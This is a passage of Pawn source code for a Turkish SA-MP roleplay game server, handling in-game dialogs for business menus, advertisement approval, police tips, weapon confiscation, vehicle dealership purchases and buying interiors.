	        new _say = IsyeriMenuSay(mesafe);
			if(listitem ==_say)
			{
				return IsyeriMenuEkle(playerid);
			}
			new mstring[248],query[128],rows,fields,_ttip[12],__ad[32];
			format(query, sizeof(query), "SELECT * FROM `isyerimenu` WHERE `id` = '%d'",mesafe);
			new Cache:cache = mysql_query(query,true);
            cache_get_data(rows, fields, g_iHandle);
           	cache_get_field_content(listitem, "isim", __ad);
            if(cache_get_field_content_int(listitem, "tip") == 1) _ttip = "Yiyecek";
            else if(cache_get_field_content_int(listitem, "tip") == 2) _ttip = "Ýçecek";
			format(mstring, sizeof(mstring), "Tip\t\t "C2"%s\nÝsim\t\t "C2"%s\nFiyat\t\t "C2"%d\nModel\t\t "C2"%d\n"C2"Menü Sil",
				_ttip,
				__ad,
				cache_get_field_content_int(listitem, "fiyat"),
                cache_get_field_content_int(listitem, "model"));
			cache_delete(cache);
			ShowPlayerDialog(playerid, 370, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Ýþyeri Menüsü", mstring, "Düzenle", "Geri");
			SetPVarInt(playerid, "MenuDuzenleID", listitem);
		}
		return 1;
	}
	if(dialogid == 348)
	{
	    if(response)
	    {
			switch(listitem)
			{
			    case 0:
				{
					if(GetPVarInt(playerid, "MenuTip") == 0) SetPVarInt(playerid, "MenuTip", 1);
					else if(GetPVarInt(playerid, "MenuTip") == 1) SetPVarInt(playerid, "MenuTip", 2);
					else if(GetPVarInt(playerid, "MenuTip") == 2) SetPVarInt(playerid, "MenuTip", 1);
					IsyeriMenuEkle(playerid);
				}
				case 1:
				{
				    ShowPlayerDialog(playerid, 349, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Menü Ekle", ""C1"Menünüze bir fiyat belirleyin:", "Menü Ekle", "Ýptal");
				}
				case 2:
				{
				    if(GetPVarInt(playerid, "MenuTip") == 0) return Hata(playerid, "Öncelikle menü tipini belirlemeniz gerekmektedir."),IsyeriMenuEkle(playerid);
					if(GetPVarInt(playerid, "MenuTip") == 1)
					{
					    new _modell[5];
					    _modell[0] = 2703;
					    _modell[1] = 2768;
					    _modell[2] = 19811;
					    _modell[3] = 2769;
					    _modell[4] = 19580;
					    ShowModelSelectionMenuEx(playerid, _modell, 5, ""C7"EIGHTBORN - "C8"Menü Model", MENU_MODEL, 16.0, 0.0, -55.0);
					}
					else
					{
					    new _modell[5];
					    _modell[0] = 19835;
					    _modell[1] = 2647;
					    _modell[2] = 19570;
					    _modell[3] = 19563;
					    _modell[4] = 19564;
					    ShowModelSelectionMenuEx(playerid, _modell, 5, ""C7"EIGHTBORN - "C8"Menü Model", MENU_MODEL, 16.0, 0.0, -55.0);
					}
				}
				case 3:
				{
					ShowPlayerDialog(playerid, 350, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Menü Ekle", ""C1"Menünüze bir isim belirleyin:", "Menü Ekle", "Ýptal");
				}
				case 4:
				{
					new
					    _yad[32],
						_ytip = GetPVarInt(playerid, "MenuTip"),
					 	_ypara = GetPVarInt(playerid, "MenuFiyat"),
					 	_ymodel = GetPVarInt(playerid, "MenuModel");

					GetPVarString(playerid, "MenuAd", _yad, sizeof(_yad));
					if(_ytip == 0) return Hata(playerid, "Menü tipini belirtmemiþsiniz."),IsyeriMenuEkle(playerid);
					if(_ypara == 0) return Hata(playerid, "Menü parasýný belirtmemiþsiniz."),IsyeriMenuEkle(playerid);
					if(_ymodel == 0) return Hata(playerid, "Menü modelini belirtmemiþsiniz."),IsyeriMenuEkle(playerid);
					if(Buysa(_yad,"Yok")) return Hata(playerid, "Menü ismini belirtmemiþsiniz."),IsyeriMenuEkle(playerid);
					format(_yad,sizeof(_yad),"%s",EscapeString(_yad));

					new mstring[128];
					format(mstring, sizeof(mstring), "INSERT INTO `isyerimenu` (`id`,`tip`,`fiyat`,`model`,`isim`) VALUES ('%d','%d','%d','%d','%s')",
					GetPVarInt(playerid, "MenuIsyeriID"),
					_ytip,
					_ypara,
					_ymodel,
					_yad);
					mysql_tquery(1,mstring);

					Bilgi(playerid, "Menünüzü baþarýyla iþyerinize eklediniz.");
				}
			}
		}
	    return 1;
	}
	if(dialogid == 349)
	{
	    if(response)
		{
		    new _yparaa = strval(inputtext);
		    if(_yparaa < 0 || _yparaa > 5000) return Hata(playerid, "Menü fiyatýnýz 5.000$'ýn üstünde olamaz."),IsyeriMenuEkle(playerid);
		    SetPVarInt(playerid, "MenuFiyat", _yparaa);
			IsyeriMenuEkle(playerid);
		}
	    return 1;
	}
	if(dialogid == 350)
	{
	    if(response)
	    {
            if(strlen(inputtext) > 31) return Hata(playerid, "Menü isminiz bu kadar uzun olamaz."),IsyeriMenuEkle(playerid);
	        new _nstring[32];
	        format(_nstring, sizeof(_nstring), "%s", inputtext);
	        SetPVarString(playerid, "MenuAd", _nstring);
	        IsyeriMenuEkle(playerid);
		}
		return 1;
	}
	if(dialogid == 351)
	{
	    if(response)
	    {
	    	new _say=-1,query[128],rows,fields,_ttip[12],__ad[32];
	    	new _iid = GetPVarInt(playerid, "IsyeriMenuSatinal");
			format(query, sizeof(query), "SELECT * FROM `isyerimenu` WHERE `id` = '%d'",_iid);
			new Cache:cache = mysql_query(query,true);
		    cache_get_data(rows, fields, g_iHandle);
		    for (new i = 0; i < rows; i ++)
		    {
		        _say++;
				if(_say == listitem)
				{
				    if(Karakter[playerid][para] >= cache_get_field_content_int(i, "fiyat"))
				    {
			    	cache_get_field_content(i, "isim", __ad);
			        if(cache_get_field_content_int(i, "tip") == 1) _ttip = "yiyeceði";
			        else if(cache_get_field_content_int(i, "tip") == 2) _ttip = "içeceði";
					format(query, sizeof(query), "Ýþyerinden %s isimli %s aldýnýz.",__ad,_ttip);
					Bilgi(playerid, query);
					GivePlayerCash(playerid, -cache_get_field_content_int(i, "fiyat"));
					Isyeri[_iid][ikasa] += cache_get_field_content_int(i, "fiyat")/2;
					if(GetPlayerCan(playerid) < 100-cache_get_field_content_int(i, "fiyat")) SetPlayerHealth(playerid, GetPlayerCan(playerid)+cache_get_field_content_int(i, "fiyat"));
					if(GetPlayerCan(playerid) >= 100-cache_get_field_content_int(i, "fiyat")) SetPlayerHealth(playerid, 100.0);
					break;
					}
					else Hata(playerid, "Üzerinizde yeterli miktarda nakit bulunmuyor.");
				}
			}
			cache_delete(cache);
	    }
	    return 1;
	}
	if(dialogid == 352)
	{
	    if(response)
	    {
	        new _osay=0, mstring[256];
	        if(Birlik[Karakter[playerid][birlik]][ftip] == SANTV)
	        {
		        for(new i;i<MAX_PLAYERS;i++)
		        {
		            if(reklamgonderdi[i] == 1 && reklambirlik[i] == Karakter[playerid][birlik])
		            {
			            _osay++;
			            if(_osay == listitem+1)
			            {
					        format(mstring, sizeof(mstring), ""C2"%s["C1"%d"C2"]\n"C2"( "C1"%s "C2")",OyuncuAdiniBul(i),i,reklamesaj[i]);
					        SetPVarInt(playerid, "ReklamCevapla", i);
					        break;
						}
					}
				}
			}
			else
			{
			    for(new i;i<MAX_PLAYERS;i++)
		        {
		            if(reklamgonderdi[i] == 1)
		            {
			            _osay++;
			            if(_osay == listitem+1)
			            {
					        format(mstring, sizeof(mstring), ""C2"%s["C1"%d"C2"]\n"C2"( "C1"%s "C2")",OyuncuAdiniBul(i),i,reklamesaj[i]);
					        SetPVarInt(playerid, "ReklamCevapla", i);
					        break;
						}
					}
				}
			}
	        ShowPlayerDialog(playerid, 353, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Reklam", mstring, "Ýþlem Yap", "Ýþlem Kapat");
	    }
	    return 1;
	}
	if(dialogid == 353)
	{
		if(response)
		{
		    new mstring[256];
		    new i = GetPVarInt(playerid, "ReklamCevapla");
      		format(mstring, sizeof(mstring), ""C2"%s["C1"%d"C2"]\n"C2"( "C1"%s "C2")",OyuncuAdiniBul(i),i,reklamesaj[i]);
		    ShowPlayerDialog(playerid, 354, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Reklam", mstring, "Onayla", "Reddet");
		}
	    return 1;
	}
	if(dialogid == 354)
	{
	    if(response)
	    {
	        new rid = GetPVarInt(playerid, "ReklamCevapla");
            if(Karakter[rid][para] >= reklamfiyat[rid])
			{
			    new string[256];
	            GivePlayerCash(rid, -reklamfiyat[rid]);
	            new stringmid[512];
	            if(strlen(reklamesaj[rid]) > 80)
				{
    				strmid(stringmid, reklamesaj[rid], 0, 64, 256);
					if(Birlik[Karakter[playerid][birlik]][ftip] == SANTV) {
						format(string, sizeof(string), "{00C300}[%s REKLAM] %s ...", Birlik[Karakter[playerid][birlik]][fisim], stringmid);
						new pbanka2;
						pbanka2 = BankaParaHesapno(Birlik[Karakter[playerid][birlik]][hesapno]);
						pbanka2 += reklamfiyat[rid];
						BankaParaDuzenHesapno(Birlik[Karakter[playerid][birlik]][hesapno], pbanka2);
					}
					else format(string, sizeof(string), "{00C300}[REKLAM] %s ...", stringmid);
					foreach(new i : Player)
					{
						if(!gReklamKapa[i]) SendClientMessage(i, 0x00C300FF, string);
					}
					strmid(stringmid, reklamesaj[rid], 64, strlen(reklamesaj[rid]), 256);
					format(string, sizeof(string), "%s {00C300}[%s - %d]", stringmid, OyuncuAdiniBul(rid,1), Karakter[rid][telno]);
					foreach(new i : Player)
					{
						if(!gReklamKapa[i]) SendClientMessage(i, 0x00C300FF, string);
					}
					new mstring[128];
					if(Birlik[Karakter[playerid][birlik]][ftip] == SANTV) format(mstring, sizeof(mstring), "%s yetkilileri reklamýnýzý onayladý.", Birlik[Karakter[playerid][birlik]][fisim]);
					else format(mstring, sizeof(mstring), "Yetkililer reklamýnýzý onayladý.");
					Bilgi(rid, mstring);
					Bilgi(playerid, "Reklamý onayladýnýz.");
					reklamfiyat[rid] = 0;
					reklamgonderdi[rid] = 0;
					reklamsira[rid] = 0;
					strdel(reklamesaj[playerid], 0, strlen(reklamesaj[playerid]));
					reklamlar[reklambirlik[rid]]--;
					reklambirlik[rid] = 0;
					return 1;
				}
				if(Birlik[Karakter[playerid][birlik]][ftip] == SANTV) {
					format(string, sizeof(string), "{00C300}[%s REKLAM] %s {00C300}[%s - %d]", Birlik[Karakter[playerid][birlik]][fisim], reklamesaj[rid], OyuncuAdiniBul(rid,1), Karakter[rid][telno]);
					new pbanka2;
					pbanka2 = BankaParaHesapno(Birlik[Karakter[playerid][birlik]][hesapno]);
					pbanka2 += reklamfiyat[rid];
					BankaParaDuzenHesapno(Birlik[Karakter[playerid][birlik]][hesapno], pbanka2);
				}
				else format(string, sizeof(string), "{00C300}[REKLAM] %s {00C300}[%s - %d]", reklamesaj[rid], OyuncuAdiniBul(rid,1), Karakter[rid][telno]);
				foreach(new i : Player)
				{
					if(!gReklamKapa[i]) SendClientMessage(i, -1, string);
				}
    			new mstring[128];
    			if(Birlik[Karakter[playerid][birlik]][ftip] == SANTV) format(mstring, sizeof(mstring), "%s yetkilileri reklamýnýzý onayladý.", Birlik[Karakter[playerid][birlik]][fisim]);
				else format(mstring, sizeof(mstring), "Yetkililer reklamýnýzý onayladý.");
				Bilgi(rid, mstring);
				Bilgi(playerid, "Reklamý onayladýnýz.");
				reklamfiyat[rid] = 0;
				reklamgonderdi[rid] = 0;
				reklamsira[rid] = 0;
				reklamlar[reklambirlik[rid]]--;
				reklambirlik[rid] = 0;
				strdel(reklamesaj[playerid], 0, strlen(reklamesaj[playerid]));
			}
			else
			{
			    Hata(playerid, "Oyuncunun üzerinde yeteri para yok.");
			    Hata(rid, "Üzerinizde reklam için yeterli para yok. Karakter sayýsýný azaltmayý deneyin.");
			}
	    }
	    else
	    {
	        new rid = GetPVarInt(playerid, "ReklamCevapla");
	        Bilgi(playerid, "Reklamý reddetdiniz.");
			reklamfiyat[rid] = 0;
			reklamgonderdi[rid] = 0;
			reklamsira[rid] = 0;
			reklamlar[reklambirlik[rid]]--;
			reklambirlik[rid] = 0;
			strdel(reklamesaj[playerid], 0, strlen(reklamesaj[playerid]));
	    }
	    return 1;
	}
	if(dialogid == 355)
	{
	    if(response)
	    {
	        new _osay=0, mstring[318];
	        for(new i;i<MAX_IHBAR;i++)
	        {
	            if(Ihbar[i][ihbarveren] > 0)
	            {
		            _osay++;
		            if(_osay == listitem+1)
		            {
				        format(mstring, sizeof(mstring), ""C2"%s["C1"%d"C2"]\n"C2"( "C1"%s "C2")\n%s",SQLFromName(Ihbar[i][ihbarveren]),Ihbar[i][ihbarno],Ihbar[i][ihbartext],Ihbar[i][ihbartarih]);
				        SetPVarInt(playerid, "IhbarCevapla", i);
				        break;
					}
				}
			}
	        ShowPlayerDialog(playerid, 356, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ýhbar", mstring, "Ýhbarý Sil", "Geri");
	    }
	    return 1;
	}
	if(dialogid == 356)
	{
	    if(response)
	    {
	        Bilgi(playerid, "Ýhbarý sildiniz.");
	        new ihbarid = GetPVarInt(playerid, "IhbarCevapla");
	        Ihbar[ihbarid][ihbarveren] = 0;
	        strdel(Ihbar[ihbarid][ihbartext], 0, 256);
	        Ihbar[ihbarid][ihbarno] = 0;
	    }
	    else
	    {
	    	new mstring[2048];
			for(new i;i<MAX_IHBAR;i++)
			{
			    if(Ihbar[i][ihbarveren] > 0)
			    {
			    	format(mstring, sizeof(mstring), "%s"C2"%s["C1"%d"C2"]\n",mstring, SQLFromName(Ihbar[i][ihbarveren]), Ihbar[i][ihbarno]);
				}
			}
			ShowPlayerDialog(playerid, 355, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Ýhbar", mstring, "Seç", "Ýptal");
			if(isnull(mstring)) Hata(playerid, "Herhangi bir ihbar bulunmamaktadýr.");
	    }
	    return 1;
	}
	if(dialogid == 950)
	{
	    if(response)
	    {
	        new _osay=0, mstring[318];
	        for(new i;i<MAX_IHBAR;i++)
	        {
	            if(Ihbar[i][ihbarveren] > 0)
	            {
		            _osay++;
		            if(_osay == listitem+1)
		            {
				        format(mstring, sizeof(mstring), ""C2"%s["C1"%d"C2"]\n"C2"( "C1"%s "C2")\n%s",SQLFromName(Ihbar[i][ihbarveren]),Ihbar[i][ihbarno],Ihbar[i][ihbartext],Ihbar[i][ihbartarih]);
				        SetPVarInt(playerid, "IhbarCevapla", i);
				        break;
					}
				}
			}
	        ShowPlayerDialog(playerid, 951, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ýhbar", mstring, "Yönel", "Geri");
	    }
	    return 1;
	}
	if(dialogid == 951)
	{
	    if(response)
	    {
     		new mstring[318];
		    format(mstring,sizeof(mstring),"[CH: 911, S:1] %s: son nolu ihbara yöneliyoruz.",OyuncuAdiniBul(playerid));
			foreach(new i : Player)
			{
				if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Girdi[i]){
					MesajGonder(i,0x8D8DFFFF,mstring);
  				}
				return 1;
			}
	    }
	    return 1;
	}
	if(dialogid == 357)
	{
	    if(response)
	    {
	        if(Buysa(gAFKRANDOM[playerid],inputtext))
	        {
				Bilgi(playerid, "AFK kontrolünü baþarýyla geçtiniz.");
				gAFKTIMER[playerid] = 0;
				strdel(gAFKRANDOM[playerid], 0, 7);
	        }
	        else
	        {
	            Hata(playerid, "AFK kontrolünü geçemediðiniz için sunucudan atýldýnýz.");
		    	KickEx(playerid);
		    	return 1;
	        }
		}
		else
		{
		    Hata(playerid, "AFK kontrolünü geçemediðiniz için sunucudan atýldýnýz.");
		    KickEx(playerid);
		    return 1;
		}
		return 1;
	}
	if(dialogid == 358)
	{
		if(response)
		{
		    if(!IsPlayerInVehicle(playerid, silahalev[playerid])) return Hata(playerid, "Silahýna el koymak istediðiniz aracýn içerisinde olmalýsýnýz.");
		    new query[128],silahisim1[60],rows,fields,_no,_id;
		    format(query, sizeof(query), "SELECT * FROM `aracsilah` WHERE `aracID` = '%d'",Arac[silahalev[playerid]][aid]);
			new Cache:cache = mysql_query(query,true);
			cache_get_data(rows, fields, g_iHandle);
			_no=cache_get_field_content_int(listitem, "no");
			cache_delete(cache);
			foreach(new i : Guns)
			{
				if(OyuncuSilah[i][no] == _no)
				{
					_id=i;
					break;
				}
			}
			format(query,sizeof(query), "DELETE FROM `aracsilah` WHERE `aracID` = '%d' AND `no` = '%d'",Arac[silahalev[playerid]][aid], _no);
			mysql_tquery(1,query);
            switch(OyuncuSilah[_id][silahid])
		    {
		        case 0: silahisim1 = "Boþ";
		        case 1: silahisim1 = "Muþta";
		        case 2: silahisim1 = "Golf Sopasý";
		        case 3: silahisim1 = "Cop";
		        case 4: silahisim1 = "Býçak";
		        case 5: silahisim1 = "Beyzbol Sopasý";
		        case 6: silahisim1 = "Kürek";
		        case 7: silahisim1 = "Bilardo Sopasý";
		        case 8: silahisim1 = "Katana";
		        case 9: silahisim1 = "Testere";
		        case 10: silahisim1 = "Mor Dildo";
		        case 11: silahisim1 = "Küçük Beyaz Vibrator";
		        case 12: silahisim1 = "Büyük Beyaz Vibrator";
		        case 13: silahisim1 = "Gümüþ Vibrator";
		        case 14: silahisim1 = "Çiçek Demeti";
		        case 15: silahisim1 = "Baston";
		        case 16: silahisim1 = "El Bombasý";
		        case 17: silahisim1 = "Sis Bombasý";
		        case 18: silahisim1 = "Molotof";
		        case 22: silahisim1 = "Pistol";
		        case 23: silahisim1 = "Susturuculu Pistol";
		        case 24: silahisim1 = "Desert Eagle";
		        case 25: silahisim1 = "Shotgun";
		        case 26: silahisim1 = "Sawn-off Shotgun";
		        case 27: silahisim1 = "Combat Shotgun";
		        case 28: silahisim1 = "Micro SMG";
		        case 29: silahisim1 = "Mp5";
		        case 30: silahisim1 = "AK47";
		        case 31: silahisim1 = "M4";
		        case 32: silahisim1 = "Tec9";
		        case 33: silahisim1 = "Country Rifle";
		        case 34: silahisim1 = "Sniper Rifle";
		        case 35: silahisim1 = "Rocket Launcher";
		        case 36: silahisim1 = "HS Rocket Launcher";
		        case 37: silahisim1 = "Flamethrower";
		        case 38: silahisim1 = "Minigun";
		        case 39: silahisim1 = "Satchel Charge";
		        case 41: silahisim1 = "Spraycan";
		        case 42: silahisim1 = "Yangýn Söndürücü Tüp";
		        case 43: silahisim1 = "Kamera";
		        case 46: silahisim1 = "Paraþüt";
			}
			new query2[256];
			format(query2, sizeof(query2), "%d idli araçtan %s isimli silaha ve %d adet silah mermisine el koydunuz.",silahalev[playerid],silahisim1,OyuncuSilah[_id][mermi]);
			Bilgi(playerid, query2);
			format(query2, sizeof(query2), "[SILAH LOG] %d nolu silaha el koydu.",OyuncuSilah[_id][no]);
			Log(playerid, query2);
			format(query2,sizeof(query2),"{ffff00}[LSPD] %s, %d idli araçtan (#%d)%s model silaha LSPD adýna el koydu.",OyuncuAdiniBul(playerid),silahalev[playerid],OyuncuSilah[_id][no],silahisim1);
			for(new i=0;i<MAX_PLAYERS;i++){
			if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Girdi[i]){
			MesajGonder(i,0xffff00FF,query2);
			}
			}
			OyuncuSilah[_id][durum] = 5;
			OyuncuSilahKaydetEx(_id);
			silahalev[playerid] = 0;
		}
		return 1;
	}
	if(dialogid == 359)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
			    GaleriListeGoster(playerid);
			}
			if(listitem == 1)
			{
			    new mesafe = IsyeriMesafesi(5.0, playerid);
			    if(mesafe == 0) return Hata(playerid, "Ýþyerinizin yakýnýnda olmalýsýnýz.");
			    if(Isyeri[mesafe][itip] != 21) return Hata(playerid, "Super Sport Galeri'ye sahip deðilsiniz.");
			    new mstring[1024];
				format(mstring, sizeof(mstring), "Araç\tFiyat\n");
				for(new i = 0; i < sizeof(SSGaleriListe); i++) {
					format(mstring, sizeof(mstring), "%s\n"CIZGI1" {bada55}%s\t "C1"%d"DOLAR"$", mstring, GetVehicleNameEx(SSGaleriListe[i]), SSGaleriFiyat(SSGaleriListe[i]));
				}
				ShowPlayerDialog(playerid, 360, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Super Sport Galeri", mstring, "Satýn Al", "Ýptal");
			}
	    }
		return 1;
	}
	if(dialogid == 360)
	{
	    if(response)
	    {
	        SectigiArac[playerid] = SSGaleriListe[listitem];
	        SSAracSatinalMenu(playerid);
	    }
	    return 1;
	}
	if(dialogid == 361)
	{
	    if(response)
	    {
	        if(listitem == 20) return GaleriListeGoster(playerid, 2);
			SectigiArac[playerid] = GaleriListe[listitem];
			GaleriAracSatinalMenu(playerid);
	    }
	    return 1;
	}
	if(dialogid == 362)
	{
	    if(response)
	    {
	        if(listitem == 20) return GaleriListeGoster(playerid, 3);
	        if(listitem == 21) return GaleriListeGoster(playerid, 1);
			SectigiArac[playerid] = GaleriListe[listitem+20];
			GaleriAracSatinalMenu(playerid);
	    }
	    return 1;
	}
	if(dialogid == 363)
	{
	    if(response)
	    {
	        if(listitem == 20) return GaleriListeGoster(playerid, 4);
	        if(listitem == 21) return GaleriListeGoster(playerid, 2);
			SectigiArac[playerid] = GaleriListe[listitem+40];
			GaleriAracSatinalMenu(playerid);
	    }
	    return 1;
	}
	if(dialogid == 364)
	{
	    if(response)
	    {
	        if(listitem == 21) return GaleriListeGoster(playerid, 3);
			SectigiArac[playerid] = GaleriListe[listitem+60];
			GaleriAracSatinalMenu(playerid);
	    }
	    return 1;
	}
	if(dialogid == 365)
	{
		if(response)
		{
			switch(listitem)
			{
		    	case 0: AracRenk1Exx(playerid);//RENK1
			    case 1: AracRenk2Exx(playerid);//RENK2
			    case 2://HIZSABIT
				{
				    if(!IsDoorVehicleEx(SectigiArac[playerid])) return GaleriAracSatinalMenu(playerid);
					if(SectigiHizSabit[playerid] == 0)
					{
					    SectigiHizSabit[playerid] = 1;
					}
					else if(SectigiHizSabit[playerid] == 1)
					{
					    SectigiHizSabit[playerid] = 0;
					}
					GaleriAracSatinalMenu(playerid);
				}
				case 3: GaleriAracSatinalMenu(playerid);//FIYAT
				case 4://ONAYLA
			    {
			    	if(Karakter[playerid][para] >= AldigiAracFiyati[playerid])
			        {
      					new hurdaArac = 0, new_vehicle_sql_id;
						new query[1024];
						for(new i; i < MAX_VEHICLES; i++) {
							if(Arac[i][ahurda] == 1) {
							    new_vehicle_sql_id = i;
								hurdaArac = i;
								LinkVehicleToInterior(i, 0);
								SetVehicleVirtualWorld(i, 0);
								AracModifiyeleriSil(i);
								DestroyVehicle(i);
								break;
							}
						}
						if(hurdaArac == 0) {
							format(query, sizeof(query), "INSERT INTO `araclar` (`model`) VALUES ('%d')", SectigiArac[playerid]);
				            new Cache:cache = mysql_query(query,true);
				            new_vehicle_sql_id = cache_insert_id();
							cache_delete(cache);
						}
						new vehicleid = CreateVehicle(SectigiArac[playerid], 1927.3710, -2237.1262, 13.5468, 0.0, SectigiAracRenk1[playerid], SectigiAracRenk2[playerid], -1, 0);
						
						if(IsValidVehicle(vehicleid))
						{
						    Arac[vehicleid][aid] = new_vehicle_sql_id;
						    Arac[vehicleid][amodel] = SectigiArac[playerid];
						    Arac[vehicleid][arenk1] = SectigiAracRenk1[playerid];
						    Arac[vehicleid][arenk2] = SectigiAracRenk2[playerid];
						    Arac[vehicleid][aowner] = Karakter[playerid][sqlid];
						    Arac[vehicleid][aposx] = 1927.3710;
						    Arac[vehicleid][aposy] = -2237.1262;
						    Arac[vehicleid][aposz] = 13.5468;
						    Arac[vehicleid][avworld] = 0;
						    Arac[vehicleid][ainterior] = 0;
						    Arac[vehicleid][afiyat] = AldigiAracFiyati[playerid];
						    Arac[vehicleid][ahasar] = 1000.0;
						    Arac[vehicleid][alights] = 0;
						    Arac[vehicleid][abenzin] = 100.0;
						    Arac[vehicleid][apaintjob] = 99;
						    Arac[vehicleid][aspawn] = 1;
							Arac[vehicleid][akilittip] = 1;
							Arac[vehicleid][aimmo] = 1;
							Arac[vehicleid][aalarm] = 1;
							Arac[vehicleid][atip] = 1;
							Arac[vehicleid][abirlik] = 255;
							Arac[vehicleid][abenzintip] = SectigiYakit[playerid];
							Arac[vehicleid][ahizsabit] = SectigiHizSabit[playerid];
							Arac[vehicleid][vergi] = 0;
							Arac[vehicleid][ahurda] = 0;
							Arac[vehicleid][akm] = 0;
							Arac[vehicleid][ametre] = 0;
							Arac[vehicleid][aisyeri] = 0;
							Arac[vehicleid][agelir] = 0;
							Aractamiri(vehicleid);
							new plakakyd[128];
			        		format(plakakyd, sizeof(plakakyd), "%s", RandomPlaka());
			        		strmid(Arac[vehicleid][aplaka], plakakyd, 0, strlen(plakakyd), 255);
							AracKaydet(vehicleid);

				 			LinkVehicleToInterior(vehicleid, 0);
							SetVehicleVirtualWorld(vehicleid, 0);
							SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
							SetVehicleToRespawn(vehicleid);
							if(!IsABike(vehicleid)) MotoruKapat(vehicleid);

							GivePlayerCash(playerid, -AldigiAracFiyati[playerid]);
							Bilgi(playerid, "Araç teslimatý baþarýyla gerçekleþti.(Havalimaný - /aliste)");
							new araclogla[110];
							format(araclogla, sizeof(araclogla), "[Normal GALERI - /a satinal] Galeriden %d idli araci satin aldi. model: %d fiyat: %d aowner: %d", Arac[vehicleid][aid],Arac[vehicleid][amodel],Arac[vehicleid][afiyat], Arac[vehicleid][aowner]);
							Log(playerid, araclogla);
						}
					}
					else return Hata(playerid, "Üzerinizde yeterli miktarda para bulunmamaktadýr.");
			    }
			}
		}
		return 1;
	}
	if(dialogid == 366)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
		        new _om = GetPVarInt(playerid, "OrnekMekan"),_omid= GetPVarInt(playerid, "IntAlID");
			    switch(_om)
			    {
			        case 2:
			        {
					    DONDUR(playerid);
						SetPlayerPos(playerid, Interior[_omid][intx], Interior[_omid][inty], Interior[_omid][intz]);
						Bilgi(playerid, "Daireyi gezmeniz için 1 dakikanýz var.");
			        }
			        case 3:
			        {
					    DONDUR(playerid);
			            SetPlayerPos(playerid, Interior[_omid][intx], Interior[_omid][inty], Interior[_omid][intz]);
						Bilgi(playerid, "Ýþyerini gezmeniz için 1 dakikanýz var.");
			        }
			    }
				SetPlayerVirtualWorld(playerid, 117);
				SetPlayerInterior(playerid, Interior[_omid][intint]);
				SetTimerEx("UnfreezeTimer", 1500, 0, "i", playerid);
			    Ipucu(playerid, "Çýkmak için ''/ornekcik'' komutunu kullanabilirsiniz.");
			    gMekanGeziyor[playerid] = true;
			    gMekanTimer[playerid] = SetTimerEx("GeziBitir", 60000, false, "i", playerid);
			}
			if(listitem == 1)
			{
			    new _om = GetPVarInt(playerid, "OrnekMekan"),_omid= GetPVarInt(playerid, "IntAlID");
			    new _tur[10];
			    switch(_om)
			    {
			        case 2:
					{
						_tur = "Ev";
						if(!Evlerim(playerid)) return Hata(playerid, "Herhangi bir eviniz bulunmamaktadýr.");
					}
			        case 3:
					{
						_tur = "Ýþyeri";
					}
			    }
			    new _sure = floatround(Interior[_omid][intfiyat]/20000);
			    new _string[512];
			    format(_string, sizeof(_string), ""C1"Interior ID:\t\t\t "C2"%d\n"C1"Interior Türü:\t\t\t "C2"%s\n"C1"Interior Fiyat:\t\t\t "C2"%d\n"C1"Interior Yapým Süresi:\t\t "C2"Hemen\n\n"C2"Interioru satýn almak istiyor musunuz:",_omid,_tur,Interior[_omid][intfiyat]);
			    ShowPlayerDialog(playerid, 367, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Interior", _string, "Evet", "Hayýr");
			    #pragma unused _sure
			}
	    }
	    return 1;
	}
	if(dialogid == 367)
	{
	    if(response)
	    {
	        new _om = GetPVarInt(playerid, "OrnekMekan"),_omid= GetPVarInt(playerid, "IntAlID"),q=GetPVarInt(playerid, "IntID");
	        if(GetPlayerCash(playerid) < Interior[_omid][intfiyat]) return Hata(playerid, "Üzerinizde yeterli miktarda para yok.");
	        GivePlayerCash(playerid, -Interior[_omid][intfiyat]);
			switch(_om)
			{
				case 2:
			    {
			    	Bilgi(playerid, "Ev interiorunu baþarýyla satýn aldýnýz.");
					new mstring[128];
					Log(playerid, "Ev interior satin alindi.");
					Ev[q][eintid] = _omid;
					Ev[q][cikisX] = Interior[Ev[q][eintid]][intx];
					Ev[q][cikisY] = Interior[Ev[q][eintid]][inty];
					Ev[q][cikisZ] = Interior[Ev[q][eintid]][intz];
			        Ev[q][ecikisint] = Interior[Ev[q][eintid]][intint];
					EvKaydet(q);
					format(mstring, sizeof(mstring), "%s adresli evinizi inþa ettirmeye baþladýnýz. süre:Hemen",GetLocation(Ev[q][girisX],Ev[q][girisY],Ev[q][girisZ]));
					Bilgi(playerid, mstring);
					/*for(new q=0;q<sizeof(Ev);q++)
					{
						if(Ev[q][esahip] == Karakter[playerid][sqlid] || Ev[q][kiralayan] == Karakter[playerid][sqlid] || Karakter[playerid][eanahtar][Ev[q][eid]] == 1)
						{
						    format(mstring, sizeof(mstring), "%sevID:%d\t Adres:%s\n",mstring, q, GetLocation(Ev[q][girisX],Ev[q][girisY],Ev[q][girisZ]));
						}
					}
					Ipucu(playerid, "Ýnterioru hangi eve inþa ettirmek istediðinizi seçin.");
					ShowPlayerDialog(playerid, 368, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Interior", mstring, "Seç", "");*/
     			}
			    case 3:
			    {
			        Bilgi(playerid, "Ýþyeri interiorunu baþarýyla satýn aldýnýz.");
					new mstring[128];
					Log(playerid, "Ýþyeri interior satin alindi.");
					Isyeri[q][iintid] = _omid;
	    			Isyeri[q][cikisX] = Interior[Isyeri[q][iintid]][intx];
	        		Isyeri[q][cikisY] = Interior[Isyeri[q][iintid]][inty];
	        		Isyeri[q][cikisZ] = Interior[Isyeri[q][iintid]][intz];
	        		Isyeri[q][icikisint] = Interior[Isyeri[q][iintid]][intint];
	    			IsyeriKaydet(q);
